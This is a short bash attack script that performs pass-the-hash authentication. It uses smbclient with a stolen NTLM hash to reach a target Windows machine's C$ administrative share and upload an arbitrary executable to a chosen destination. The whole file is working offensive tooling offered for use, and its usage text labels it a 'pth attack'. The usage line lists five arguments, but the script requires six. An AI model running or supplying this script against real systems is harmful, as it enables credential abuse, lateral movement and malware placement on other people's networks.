#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target system> <username> <password hash> <full local path to source executable> <destination path>"
	echo "Username should be <DOMAIN>/<User>"
	echo "Note that the password hash is JUST the NTLM hash.  There's no LMHash:NTLM Hash like in other pth attacks."
	echo ""
	echo "Destination Path should be something like /Users/<username>"
	echo "$0 TargetSystem.mydomain.local MYDOMAIN/SomeUser bd16e53fa8b531ef39825474afa7187c /opt/myexes/myexe.exe /Users/<username> myexe.exe"
	echo "Note that this is currently set up to only key off of the c$ share"
}

if [ $# -lt 6 ]; then
	ShowUsage
	exit 1
fi

TARGET=$1
USERNAME=$2
PASSWORD="$3"
EXECUTABLE="$4"
EXEDEST="$5"
EXEDESTNAME="$6"

smbclient //$TARGET/c$ -U $USERNAME%$PASSWORD --pw-nt-hash -c "cd $EXEDEST;put $EXECUTABLE $EXEDESTNAME"

